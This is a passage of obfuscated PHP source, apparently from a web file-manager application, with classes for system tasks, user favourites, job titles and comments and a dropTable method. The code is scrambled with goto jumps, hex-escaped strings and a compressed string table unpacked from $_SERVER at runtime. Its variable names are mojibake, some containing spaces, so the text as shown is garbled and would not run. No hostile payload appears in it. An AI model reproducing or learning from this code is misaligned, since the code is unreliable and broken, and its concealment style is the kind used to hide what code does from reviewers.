$e²¸ãä¥–ô->task[$EíŸ¦ĞÔ[989]] += 1; } $dæŸ‚ÃÉ·ƒ++; $E‹ğ¢¦¶Æ§ = trim(fgets($cŸ’‰¶ËÂ)); $e‰Ğ‚ÅŒä¹ .= $EíŸ¦ĞÔ[50] . $this->sqlDecode($E‹ğ¢¦¶Æ§, $this->type); if ($dæŸ‚ÃÉ·ƒ == $C‰º¬ÉÒÊ©) { $e‰Ğ‚ÅŒä¹ = rtrim(trim($e‰Ğ‚ÅŒä¹), $EíŸ¦ĞÔ[67]); if (!$f…ÌÔÜÚº->execute($e‰Ğ‚ÅŒä¹)) { return !1; } if ($e²¸ãä¥–ô) { $e²¸ãä¥–ô->update($dæŸ‚ÃÉ·ƒ - 1); } $e‰Ğ‚ÅŒä¹ = $EíŸ¦ĞÔ[33]; $dæŸ‚ÃÉ·ƒ = 0; } } fclose($cŸ’‰¶ËÂ); goto c…—Í“”è; D“Òù•³æö: $EíŸ¦ĞÔ =& $_SERVER[¬ˆÚÂ”Éğä]; $f…ÌÔÜÚº = $this->model()->db(); $cŸ’‰¶ËÂ = @fopen($f¾Ò‚ß ¦Â, $EíŸ¦ĞÔ[1002]); goto dÕœá¢“Ì; c´Ú¦ÕïÂ: } public function dropTable($a‡†­Û‡Ì¡ = null) { $dÕÊŸ²·´ì = $this->model()->db(); $eÚ¸ƒĞ‚à„ = $a‡†­Û‡Ì¡ ? array($a‡†­Û‡Ì¡) : $dÕÊŸ²·´ì->getTables(); if (!$eÚ¸ƒĞ‚à„) { return; } foreach ($eÚ¸ƒĞ‚à„ as $a‡†­Û‡Ì¡) { $dÕÊŸ²·´ì->execute("\144\x72\157\x70\x20\164\x61\142\154\x65\x20\x69\146\40\x65\x78\151\163\164\x73\x20\140{$a‡†­Û‡Ì¡}\x60"); } } private function taskToCache($D­âÃ¼Ë‚ = null) { $c®¹÷˜®Şƒ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$D­âÃ¼Ë‚) { return; } $D‡È’‹×ÎŞ = array($c®¹÷˜®Şƒ[991] => $D­âÃ¼Ë‚->task[$c®¹÷˜®Şƒ[991]], $c®¹÷˜®Şƒ[989] => $D­âÃ¼Ë‚->task[$c®¹÷˜®Şƒ[989]], $c®¹÷˜®Şƒ[1003] => $D­âÃ¼Ë‚->task[$c®¹÷˜®Şƒ[1003]]); if ($D‡È’‹×ÎŞ[$c®¹÷˜®Şƒ[989]] == $D‡È’‹×ÎŞ[$c®¹÷˜®Şƒ[1003]]) { $D‡È’‹×ÎŞ[$c®¹÷˜®Şƒ[704]] = 1; } Cache::set($c®¹÷˜®Şƒ[1004] . $D­âÃ¼Ë‚->task[$c®¹÷˜®Şƒ[367]], $D‡È’‹×ÎŞ); $D­âÃ¼Ë‚->end(); } private function sqlEncode($e°¢““ôÂß) { $C·†Ï³Ñã† =& $_SERVER[¬ˆÚÂ”Éğä]; $B×ç½”§î = array(); foreach ($e°¢““ôÂß as $dÅØÙ«Ñ¥) { if (is_array($dÅØÙ«Ñ¥)) { $dÅØÙ«Ñ¥ = json_encode_force($dÅØÙ«Ñ¥); } $dÅØÙ«Ñ¥ = addslashes($dÅØÙ«Ñ¥); $dÅØÙ«Ñ¥ = str_replace(array($C·†Ï³Ñã†[1005], $C·†Ï³Ñã†[217]), array($C·†Ï³Ñã†[1006], $C·†Ï³Ñã†[1007]), $dÅØÙ«Ñ¥); $B×ç½”§î[] = str_replace($C·†Ï³Ñã†[55], $C·†Ï³Ñã†[1008], $dÅØÙ«Ñ¥); } return $C·†Ï³Ñã†[55] . implode($C·†Ï³Ñã†[1009], $B×ç½”§î) . $C·†Ï³Ñã†[55]; } private function sqlDecode($AÂÌóŠ„µµ, $bÄÚ°Æèš) { $c²˜¾…³…Ö =& $_SERVER[¬ˆÚÂ”Éğä]; $AÂÌóŠ„µµ = str_replace(array($c²˜¾…³…Ö[1006], $c²˜¾…³…Ö[1007]), array($c²˜¾…³…Ö[1005], $c²˜¾…³…Ö[217]), $AÂÌóŠ„µµ); if ($bÄÚ°Æèš == $c²˜¾…³…Ö[9]) { $AÂÌóŠ„µµ = stripslashes($AÂÌóŠ„µµ); } return $AÂÌóŠ„µµ; } } goto C¤À†–òÅË; b‰‰¸ÜÛ‚—: $FÖÒªÏœË = $_SERVER[¬ˆÚÂ”Éğä][549]; if (!$FÖÒªÏœË) { return; } $_SERVER[˜] = explode($_SERVER[¬ˆÚÂ”Éğä][550], gzinflate(substr($_SERVER[¬ˆÚÂ”Éğä][551], 10, -8))); goto FÅì²Ãè¬å; EŞ¶Àã¼Ş: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\56\x74\x61\163\x6b\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\x70\145", "\145\166\x65\156\164", "\x74\x69\155\x65", "\x64\145\163\143", "\x73\x79\163\164\145\155", "\145\x6e\x61\142\x6c\145", "\x6c\141\163\164\122\165\x6e", "\163\157\162\164"); public function listData($A…“«‡Û¶¨ = false, $Dë§§áÈá = "\163\x6f\x72\164", $Aí–ÂÜŒ¡Ğ = false) { return parent::listData($A…“«‡Û¶¨, $Dë§§áÈá, $Aí–ÂÜŒ¡Ğ); } public function add($d×ßªÕ†§‘) { $a°–·¨¼‡ò =& $_SERVER[¬ˆÚÂ”Éğä]; $cÇİ¸­”˜Š = $this->findByName($d×ßªÕ†§‘[$a°–·¨¼‡ò[28]]); if ($cÇİ¸­”˜Š) { return !1; } $d×ßªÕ†§‘[$a°–·¨¼‡ò[1415]] = 0; $d×ßªÕ†§‘[$a°–·¨¼‡ò[2143]] = $this->getSort(); return parent::insert($d×ßªÕ†§‘); } private function getSort() { $F£›§—ˆ =& $_SERVER[¬ˆÚÂ”Éğä]; $EøìÄóØë = parent::listData(); $F‰ßòÙ»‘ì = array_to_keyvalue($EøìÄóØë, $F£›§—ˆ[33], $F£›§—ˆ[2143]); return empty($F‰ßòÙ»‘ì) ? 0 : max($F‰ßòÙ»‘ì) + 1; } public function update($CŒÃô«ø, $f´î†ÚÖ²š) { $E¶éù¡Ì­¼ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÀ„–¤ˆ“Ö = $this->listData($CŒÃô«ø); $BƒÖÄ›ã¬ó = $this->findByName($f´î†ÚÖ²š[$E¶éù¡Ì­¼[28]]); if (!$DÀ„–¤ˆ“Ö || $BƒÖÄ›ã¬ó && $BƒÖÄ›ã¬ó[$E¶éù¡Ì­¼[367]] != $DÀ„–¤ˆ“Ö[$E¶éù¡Ì­¼[367]]) { return !1; } return parent::update($CŒÃô«ø, $f´î†ÚÖ²š); } public function remove($e­éæÎ´, $FĞ¥ôŒ›¿Ç = false) { $báÌØç¾”© =& $_SERVER[¬ˆÚÂ”Éğä]; $F‡ï†à±•™ = $this->listData($e­éæÎ´); if (!$F‡ï†à±•™) { return; } if (!$FĞ¥ôŒ›¿Ç && $F‡ï†à±•™[$báÌØç¾”©[1093]] == $báÌØç¾”©[83]) { return !1; } return parent::remove($e­éæÎ´); } public function enable($b¹è©İØÌ, $A†–ÕÙÉ¸) { return $this->update($b¹è©İØÌ, array($_SERVER[¬ˆÚÂ”Éğä][2522] => $A†–ÕÙÉ¸)); } public function run($b‰†Â•›İ) { return $this->update($b‰†Â•›İ, array($_SERVER[¬ˆÚÂ”Éğä][2532] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($C¾ğğÔ£†¸) { $cº‚—¼Éòš =& $_SERVER[¬ˆÚÂ”Éğä]; return array($cº‚—¼Éòš[2217] => array(USER_ID, $cº‚—¼Éòš[2533])); } protected function listData() { $dâ¶Š¯ğ¢Š =& $_SERVER[¬ˆÚÂ”Éğä]; $fŸÀïğ…Ô = array($dâ¶Š¯ğ¢Š[1441] => USER_ID, $dâ¶Š¯ğ¢Š[436] => 0); $CÃ‘³ƒ“ğ = $dâ¶Š¯ğ¢Š[2534]; $C¤Ù‘Ÿ„¯ = $this->field($CÃ‘³ƒ“ğ)->where($fŸÀïğ…Ô)->order($dâ¶Š¯ğ¢Š[2535])->select(); return $C¤Ù‘Ÿ„¯ ? $C¤Ù‘Ÿ„¯ : array(); } protected function resetCache() { } protected function listView() { goto AÄ“Îƒ¨ë¶; Cƒ†Š£ ŞŞ: $Dšìš³‘¿Ò = array($D¡Èà˜ñÇ[383] => array($D¡Èà˜ñÇ[384], $FÕ÷Ä­™‚)); $EÈä†Ó Ö = Model($D¡Èà˜ñÇ[760])->listSource($Dšìš³‘¿Ò, $FÉÃÃèÌ—ó); $EÈä†Ó Ö = array_merge($EÈä†Ó Ö[$D¡Èà˜ñÇ[73]], $EÈä†Ó Ö[$D¡Èà˜ñÇ[74]]); goto Dİ¼Àî­Ñ¼; BØˆØËè Š: $FÕ÷Ä­™‚ = array_to_keyvalue($c¡õ”æìİï, $D¡Èà˜ñÇ[33], $D¡Èà˜ñÇ[75]); if (!$FÕ÷Ä­™‚) { return $Fİõ³›Üß; } $FÉÃÃèÌ—ó = 2000; goto Cƒ†Š£ ŞŞ; AÄ“Îƒ¨ë¶: $D¡Èà˜ñÇ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fİõ³›Üß = $this->listData(); $c¡õ”æìİï = array_filter_by_field($Fİõ³›Üß, $D¡Èà˜ñÇ[29], $D¡Èà˜ñÇ[382]); goto BØˆØËè Š; Dİ¼Àî­Ñ¼: $EÈä†Ó Ö = array_to_keyvalue($EÈä†Ó Ö, $D¡Èà˜ñÇ[369]); foreach ($Fİõ³›Üß as $C¦¢àğôé÷ => $B¿àà’ê³¤) { $d¬çô­…‡õ = $EÈä†Ó Ö[$B¿àà’ê³¤[$D¡Èà˜ñÇ[75]]]; $d¬çô­…‡õ = $d¬çô­…‡õ ? $d¬çô­…‡õ : array(); $Fİõ³›Üß[$C¦¢àğôé÷] = array_merge($d¬çô­…‡õ, $B¿àà’ê³¤); } return $Fİõ³›Üß; goto EöŞóŠÎá; EöŞóŠÎá: } protected function addFav($CšÀ‹›’ƒÀ, $eÖ·„¿ƒ = '', $dÑéØíÔĞË = "\163\x6f\165\x72\x63\145") { goto bçÌéÒğ³; FÈ³åÆˆ¸§: return $this->add($F¸‚ƒË…Èñ); goto Bçî¸Šº¯Á; eõÎ¨´Ä‘Ï: if (!$eÖ·„¿ƒ && $dÑéØíÔĞË == $aÁ×¤Ñ°ƒø[382]) { $fÍ‹Çˆíå± = Model($aÁ×¤Ñ°ƒø[1130])->where(array($aÁ×¤Ñ°ƒø[383] => $CšÀ‹›’ƒÀ))->find(); if (!$fÍ‹Çˆíå±) { return !1; } $eÖ·„¿ƒ = $fÍ‹Çˆíå±[$aÁ×¤Ñ°ƒø[28]]; } $eÖ·„¿ƒ = $this->getAutoName($eÖ·„¿ƒ); $F¸‚ƒË…Èñ = array($aÁ×¤Ñ°ƒø[1441] => USER_ID, $aÁ×¤Ñ°ƒø[436] => 0, $aÁ×¤Ñ°ƒø[386] => $eÖ·„¿ƒ, $aÁ×¤Ñ°ƒø[387] => $CšÀ‹›’ƒÀ, $aÁ×¤Ñ°ƒø[388] => $dÑéØíÔĞË, $aÁ×¤Ñ°ƒø[2125] => $déÈ‹ƒ›àã + 1); goto FÈ³åÆˆ¸§; bçÌéÒğ³: $aÁ×¤Ñ°ƒø =& $_SERVER[¬ˆÚÂ”Éğä]; $a‘ˆ˜Œå±† = array($aÁ×¤Ñ°ƒø[1441] => USER_ID, $aÁ×¤Ñ°ƒø[436] => 0, $aÁ×¤Ñ°ƒø[388] => $dÑéØíÔĞË, $aÁ×¤Ñ°ƒø[387] => $CšÀ‹›’ƒÀ); if ($this->where($a‘ˆ˜Œå±†)->find()) { return !1; } goto f‡¢Úèï‰õ; f‡¢Úèï‰õ: $a‘ˆ˜Œå±† = array($aÁ×¤Ñ°ƒø[1441] => USER_ID, $aÁ×¤Ñ°ƒø[436] => 0); $déÈ‹ƒ›àã = $this->where($a‘ˆ˜Œå±†)->max($aÁ×¤Ñ°ƒø[2143]); if (!$déÈ‹ƒ›àã) { $déÈ‹ƒ›àã = 0; } goto eõÎ¨´Ä‘Ï; Bçî¸Šº¯Á: } protected function remove($C›Ó†òÎ‚Ö) { $Bß°¾ºÆëã =& $_SERVER[¬ˆÚÂ”Éğä]; $F¸åÂø®â‹ = array($Bß°¾ºÆëã[1441] => USER_ID, $Bß°¾ºÆëã[385] => $C›Ó†òÎ‚Ö); return $this->where($F¸åÂø®â‹)->delete(); } protected function removeByName($B¹ÑÊÌ¦‚­) { $b…—ò‰ÜÎ¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $AåâÍ“Ïª‹ = array($b…—ò‰ÜÎ¯[1441] => USER_ID, $b…—ò‰ÜÎ¯[386] => $B¹ÑÊÌ¦‚­, $b…—ò‰ÜÎ¯[436] => 0); return $this->where($AåâÍ“Ïª‹)->delete(); } protected function rename($c¹³ÔÏ½¹È, $f–¶Ãš¸‡Ò) { $aõÒªË¬Ô‡ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($c¹³ÔÏ½¹È == $f–¶Ãš¸‡Ò) { return !1; } $a‘É­óˆë‚ = $this->getAutoName($f–¶Ãš¸‡Ò); if ($f–¶Ãš¸‡Ò != $a‘É­óˆë‚) { return !1; } $C¯£—à = array($aõÒªË¬Ô‡[1441] => USER_ID, $aõÒªË¬Ô‡[436] => 0, $aõÒªË¬Ô‡[28] => $c¹³ÔÏ½¹È); return $this->where($C¯£—à)->save(array($aõÒªË¬Ô‡[28] => $f–¶Ãš¸‡Ò)); } protected function resetSort($c„ìØ„İ¿º) { $Eõ…öÑÌ÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $c„ìØ„İ¿º = is_array($c„ìØ„İ¿º) ? $c„ìØ„İ¿º : array(); $D¦ãÈ±‡›‚ = array($Eõ…öÑÌ÷[1441] => USER_ID); for ($aŸï½Íˆ‚÷ = 0; $aŸï½Íˆ‚÷ < count($c„ìØ„İ¿º); $aŸï½Íˆ‚÷++) { $D¦ãÈ±‡›‚[$Eõ…öÑÌ÷[385]] = $c„ìØ„İ¿º[$aŸï½Íˆ‚÷]; $this->where($D¦ãÈ±‡›‚)->save(array($Eõ…öÑÌ÷[2125] => $aŸï½Íˆ‚÷ + 1)); } return !0; } protected function moveTop($aŸ¢Ğƒ¹Ú) { goto a–‰ÉÚ´…; DšÑëí„Ïá: if (!$båÚéÆÄÇß) { return; } $DÕëï»÷ìÃ = $this->field($cÏ«¼¤›ìØ[367])->where($c¶Çª ÷œˆ)->order($cÏ«¼¤›ìØ[2535])->select(); $DÕëï»÷ìÃ = array_to_keyvalue($DÕëï»÷ìÃ, $cÏ«¼¤›ìØ[33], $cÏ«¼¤›ìØ[367]); goto D—ĞÖŠ¼æ; a–‰ÉÚ´…: $cÏ«¼¤›ìØ =& $_SERVER[¬ˆÚÂ”Éğä]; $c¶Çª ÷œˆ = array($cÏ«¼¤›ìØ[1441] => USER_ID, $cÏ«¼¤›ìØ[436] => 0); $båÚéÆÄÇß = $this->where($c¶Çª ÷œˆ)->where(array($cÏ«¼¤›ìØ[28] => $aŸ¢Ğƒ¹Ú))->find(); goto DšÑëí„Ïá; D—ĞÖŠ¼æ: $bÆ¬åƒ­± = $DÕëï»÷ìÃ; $DÕëï»÷ìÃ = array_remove_value($DÕëï»÷ìÃ, $båÚéÆÄÇß[$cÏ«¼¤›ìØ[367]]); array_unshift($DÕëï»÷ìÃ, $båÚéÆÄÇß[$cÏ«¼¤›ìØ[367]]); goto dÇ×•Ãæîå; dÇ×•Ãæîå: return $this->resetSort($DÕëï»÷ìÃ); goto c‡…‘ŠŸ¡é; c‡…‘ŠŸ¡é: } protected function moveBottom($EÕ‡ÒøÃ¾) { $Bì†ìæÀÙö =& $_SERVER[¬ˆÚÂ”Éğä]; $EÆØ›òŸ¦é = array($Bì†ìæÀÙö[1441] => USER_ID, $Bì†ìæÀÙö[436] => 0); $Eæá„æÒŞ = $this->where($EÆØ›òŸ¦é)->max($Bì†ìæÀÙö[2143]); $D¤‚½ÑÄ¬ = array($Bì†ìæÀÙö[2143] => $Eæá„æÒŞ + 1); return $this->where($EÆØ›òŸ¦é)->where(array($Bì†ìæÀÙö[28] => $EÕ‡ÒøÃ¾))->save($D¤‚½ÑÄ¬); } private function getAutoName($Bêñ×ÙÉò¼) { goto E“½´Õä‘¶; AöÃå©ÇÒ: $aĞó£†‹Ôö = array_to_keyvalue($aĞó£†‹Ôö, $F•ƒ±ø„Ãğ[33], $F•ƒ±ø„Ãğ[28]); if (!$aĞó£†‹Ôö || !in_array($Bêñ×ÙÉò¼, $aĞó£†‹Ôö)) { return $Bêñ×ÙÉò¼; } for ($Côô¤áÛµ‹ = 0; $Côô¤áÛµ‹ < count($aĞó£†‹Ôö); $Côô¤áÛµ‹++) { if (!in_array($Bêñ×ÙÉò¼ . "\x28{$Côô¤áÛµ‹}\51", $aĞó£†‹Ôö)) { return $Bêñ×ÙÉò¼ . "\50{$Côô¤áÛµ‹}\51"; } } goto bà˜×ƒÜÔ‹; bà˜×ƒÜÔ‹: return $Bêñ×ÙÉò¼ . "\x28{$Côô¤áÛµ‹}\x29"; goto FÚìĞÏ¬µØ; E“½´Õä‘¶: $F•ƒ±ø„Ãğ =& $_SERVER[¬ˆÚÂ”Éğä]; $a¯ÔŸ‚š÷£ = array($F•ƒ±ø„Ãğ[1441] => USER_ID, $F•ƒ±ø„Ãğ[436] => 0); $aĞó£†‹Ôö = $this->field($F•ƒ±ø„Ãğ[28])->where($a¯ÔŸ‚š÷£)->select(); goto AöÃå©ÇÒ; FÚìĞÏ¬µØ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x6a\157\x62\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\144\x65\163\143", "\x73\157\162\x74"); const JOB_KEY = "\163\145\154\x66\112\157\x62\114\151\x73\x74"; public function listData($b‰ù…ÖÂÜ = false, $e°ÚÛ÷„ùÁ = "\163\x6f\x72\x74", $c•²µ»­Ê = false) { return parent::listData($b‰ù…ÖÂÜ, $e°ÚÛ÷„ùÁ, $c•²µ»­Ê); } public function remove($Dñ½éá…–²) { return parent::remove($Dñ½éá…–²); } public function add($E±¤—¡ã¯å) { $eù˜×Ó¹¡‡ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->findByName($E±¤—¡ã¯å[$eù˜×Ó¹¡‡[28]])) { return !1; } $E±¤—¡ã¯å[$eù˜×Ó¹¡‡[2143]] = $this->getSort(); return parent::insert($E±¤—¡ã¯å); } private function getSort() { $B¸¾­Ì¯ˆŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $f†´–ÂŒÂ = parent::listData(); $C©Á”îÌ = array_to_keyvalue($f†´–ÂŒÂ, $B¸¾­Ì¯ˆŠ[33], $B¸¾­Ì¯ˆŠ[2143]); return empty($C©Á”îÌ) ? 0 : max($C©Á”îÌ) + 1; } public function update($E­Ô“¨¾·†, $E•Ñµ¤Ä İ) { $C³“Ø‚’ã =& $_SERVER[¬ˆÚÂ”Éğä]; $AËÂö±íê  = parent::listData($E­Ô“¨¾·†); $FÔİğ‰âÆ = $this->findByName($E•Ñµ¤Ä İ[$C³“Ø‚’ã[28]]); if (!$AËÂö±íê  || $FÔİğ‰âÆ && $FÔİğ‰âÆ[$C³“Ø‚’ã[367]] != $AËÂö±íê [$C³“Ø‚’ã[367]]) { return !1; } return parent::update($E­Ô“¨¾·†, $E•Ñµ¤Ä İ); } public function setUserJob($fâÎ¥Ê­ÙØ, $dÜ‚æ•Ñ¶) { goto c‰·ƒÎ‘µ°; c‰·ƒÎ‘µ°: $AòÄœß³…ç =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_array($dÜ‚æ•Ñ¶)) { $dÜ‚æ•Ñ¶ = array($dÜ‚æ•Ñ¶); } $BÍä…šìËé = parent::listData(); goto bÖòàÛ‚¨; bÖòàÛ‚¨: $f¢ŠŸÌ‘ÈÂ = array_to_keyvalue($BÍä…šìËé, $AòÄœß³…ç[28]); $e½†µˆ‰¸ = $AòÄœß³…ç[361]; foreach ($dÜ‚æ•Ñ¶ as $e’ëç¾ô±”) { if ($f¢ŠŸÌ‘ÈÂ[$e’ëç¾ô±”]) { $e½†µˆ‰¸ .= $f¢ŠŸÌ‘ÈÂ[$e’ëç¾ô±”][$AòÄœß³…ç[367]] . $AòÄœß³…ç[47]; } else { $Dí‚Œòô§½ = $this->add($e’ëç¾ô±”); $e½†µˆ‰¸ .= $Dí‚Œòô§½ . $AòÄœß³…ç[47]; } } goto dÁŒœÙÑÚ; dÁŒœÙÑÚ: $e½†µˆ‰¸ = rtrim($e½†µˆ‰¸, $AòÄœß³…ç[47]); Model($AòÄœß³…ç[479])->metaSet($fâÎ¥Ê­ÙØ, self::JOB_KEY, $e½†µˆ‰¸); goto bÖ¶£¬ø´ñ; bÖ¶£¬ø´ñ: } public function getUserJob($EÄ÷·öëÃæ) { $DŒ½¯š¨òè = Model($_SERVER[¬ˆÚÂ”Éğä][479])->metaGet($EÄ÷·öëÃæ); return $this->getUserJobInfo($DŒ½¯š¨òè[self::JOB_KEY]); } public function getUserJobInfo($eÊñ¨ò¢í×) { goto a±Œ¤‹…Œ; a±Œ¤‹…Œ: $eìš®İ·ØÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $bË’›ãÖŠã = explode($eìš®İ·ØÓ[47], $eÊñ¨ò¢í×); $CÖŒöÕ™ß = parent::listData(); goto a¹‹ğÀË¶¤; FŒ÷•“ÜÙ’: return $b”õ˜¾×; goto e¢ñ‘¢ëÜ ; a¹‹ğÀË¶¤: $CÖŒöÕ™ß = array_remove_key($CÖŒöÕ™ß, $eìš®İ·ØÓ[187]); $b”õ˜¾× = array(); foreach ($bË’›ãÖŠã as $c—ì¸á°‰Û) { if (isset($CÖŒöÕ™ß[$c—ì¸á°‰Û])) { $b”õ˜¾×[] = $CÖŒöÕ™ß[$c—ì¸á°‰Û]; } } goto FŒ÷•“ÜÙ’; e¢ñ‘¢ëÜ : } } goto C†Ğ£ò¶¶; Fƒ­ïŞ›ãÉ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\x61\x6d\145" => "\x63\157\x6d\155\145\156\164\x5f\155\145\x74\141", "\x6d\x65\x74\141\106\x69\x65\154\x64" => "\x63\157\x6d\x6d\145\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($b°“ÀÈ¤‡‰) { $B§½È¬ƒ±‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[2148]]) { $Cõ÷Ş©­ç» = $this->where(array($B§½È¬ƒ±‘[2149] => $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[2148]]))->find(); if (!$Cõ÷Ş©­ç» || $Cõ÷Ş©­ç»[$B§½È¬ƒ±‘[371]] != $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[371]] || $Cõ÷Ş©­ç»[$B§½È¬ƒ±‘[458]] != $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[458]]) { return !1; } $this->where(array($B§½È¬ƒ±‘[2149] => $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[2148]]))->setAdd($B§½È¬ƒ±‘[2150], 1); } $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[2151]] = 0; $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[2150]] = 0; $b°“ÀÈ¤‡‰[$B§½È¬ƒ±‘[697]] = 1; return $this->add($b°“ÀÈ¤‡‰); } public function remove($dˆ’Â……§ë) { $dÇÑ®Ìä®™ =& $_SERVER[¬ˆÚÂ”Éğä]; $Bî°»„³Òî = array($dÇÑ®Ìä®™[2149] => $dˆ’Â……§ë); $Cåó–Ú¾®À = $this->where($Bî°»„³Òî)->find(); if ($Cåó–Ú¾®À[$dÇÑ®Ìä®™[2148]]) { $this->where(array($dÇÑ®Ìä®™[2149] => $Cåó–Ú¾®À[$dÇÑ®Ìä®™[2148]]))->setAdd($dÇÑ®Ìä®™[2150], -1); } return $this->where($Bî°»„³Òî)->delete(); } public function edit($A„À‘­ôŠ©, $bª¼£ƒ®­‡) { $D“˜ÏŞÓëµ =& $_SERVER[¬ˆÚÂ”Éğä]; $FÕëÎ§Š¦ = array($D“˜ÏŞÓëµ[2149] => $A„À‘­ôŠ©); return $this->where($FÕëÎ§Š¦)->save(array($D“˜ÏŞÓëµ[2152] => $bª¼£ƒ®­‡)); } public function prasise($a‚Áæ°‚é) { $DöÔˆ«Ø† =& $_SERVER[¬ˆÚÂ”Éğä]; $fà¤Ì¬­Â = Model($DöÔˆ«Ø†[2153]); $B¼÷îà ºÄ = array($DöÔˆ«Ø†[2149] => $a‚Áæ°‚é, $DöÔˆ«Ø†[1441] => USER_ID); $c‡àíÍ ê´ = $fà¤Ì¬­Â->where($B¼÷îà ºÄ)->find(); if (!$c‡àíÍ ê´) { $fà¤Ì¬­Â->add($B¼÷îà ºÄ); $e©µÓ•ôÀæ = $this->where(array($DöÔˆ«Ø†[2149] => $a‚Áæ°‚é))->setAdd($DöÔˆ«Ø†[2151], 1); } else { $fà¤Ì¬­Â->where($B¼÷îà ºÄ)->delete(); $e©µÓ•ôÀæ = $this->where(array($DöÔˆ«Ø†[2149] => $a‚Áæ°‚é))->setAdd($DöÔˆ«Ø†[2151], -1); } return $e©µÓ•ôÀæ; } public function targetInfo($EœøìĞ‡…„, $FÕ•¿„“Ï) { goto fßŠ£¶íÕ‹; fßŠ£¶íÕ‹: $D³Ö«Œ–œ =& $_SERVER[¬ˆÚÂ”Éğä]; $F°¬’Éò½ = array($D³Ö«Œ–œ[523] => $EœøìĞ‡…„, $D³Ö«Œ–œ[524] => $FÕ•¿„“Ï); $e¼Ú¦‘Çª = $this->where($F°¬’Éò½)->count(); goto D‡ÁïÃÎ’; D‡ÁïÃÎ’: $A’Ë¿Éñ–‰ = "\x52\111\x47\x48\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\x63\157\155\155\x65\156\164\137\160\162\141\151\163\145\40\163\x74\141\162\40\x6f\x6e\40\x63\x6f\155\155\x65\156\164\x2e\x63\x6f\155\x6d\x65\x6e\164\111\x44\40\x3d\x20\163\x74\141\x72\56\x63\x6f\x6d\x6d\145\156\x74\111\x44"; $aÍ¹§‰êÌ‹ = $this->alias($D³Ö«Œ–œ[341])->where($F°¬’Éò½)->join($A’Ë¿Éñ–‰, $D³Ö«Œ–œ[2154])->count(); $dèÔŸÖ÷ò = array($D³Ö«Œ–œ[2155] => $e¼Ú¦‘Çª, $D³Ö«Œ–œ[2156] => $aÍ¹§‰êÌ‹); goto Eªòµ®À½; Eªòµ®À½: return $dèÔŸÖ÷ò; goto D©¥Ç†«ÜÀ; D©¥Ç†«ÜÀ: } public function listData($E”ÁºÚâÒò) { $b¥—¦·øÇÛ =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2157]])) { if ($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2157]]) { $E”ÁºÚâÒò[$b¥—¦·øÇÛ[2158]] = array($b¥—¦·øÇÛ[940], intval($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2157]])); } unset($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2157]]); } if (isset($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2159]])) { if ($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2159]]) { $E”ÁºÚâÒò[$b¥—¦·øÇÛ[2158]] = array($b¥—¦·øÇÛ[937], intval($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2159]])); } unset($E”ÁºÚâÒò[$b¥—¦·øÇÛ[2159]]); } return $this->_listData($E”ÁºÚâÒò); } private function _listData($c¢¥ªò‡Šì) { $aê¸¦õ‘›Á =& $_SERVER[¬ˆÚÂ”Éğä]; $E£©¨èµ = $this->where($c¢¥ªò‡Šì)->_makeOrder()->selectPage(100); $this->_listAppendParent($E£©¨èµ[$aê¸¦õ‘›Á[354]]); $this->_listAppendUser($E£©¨èµ[$aê¸¦õ‘›Á[354]]); $this->_listAppendMeta($E£©¨èµ[$aê¸¦õ‘›Á[354]]); return $E£©¨èµ; } private function _makeOrder() { $A˜Š½¡ƒ§Õ =& $_SERVER[¬ˆÚÂ”Éğä]; $C„Ûã”šŸ = array($A˜Š½¡ƒ§Õ[2151], $A˜Š½¡ƒ§Õ[2150], $A˜Š½¡ƒ§Õ[187]); $F‰ÂµŠñ… = Input::get($A˜Š½¡ƒ§Õ[407], $A˜Š½¡ƒ§Õ[7], $A˜Š½¡ƒ§Õ[389], $C„Ûã”šŸ); $EšÔçÉ˜ = Input::get($A˜Š½¡ƒ§Õ[408], $A˜Š½¡ƒ§Õ[7], $A˜Š½¡ƒ§Õ[1443], array($A˜Š½¡ƒ§Õ[2160], $A˜Š½¡ƒ§Õ[405])); $A÷‹ô’á¡„ = $F‰ÂµŠñ… . $A˜Š½¡ƒ§Õ[50] . $EšÔçÉ˜; return $this->order($A÷‹ô’á¡„); } private function _listAppendParent(&$eá„íó©ù ) { goto F®Œœ¸½¿; F®Œœ¸½¿: $aÎÕ¾š¦ =& $_SERVER[¬ˆÚÂ”Éğä]; $a¨Â÷ÃÔ³å = array_unique(array_to_keyvalue($eá„íó©ù , $aÎÕ¾š¦[33], 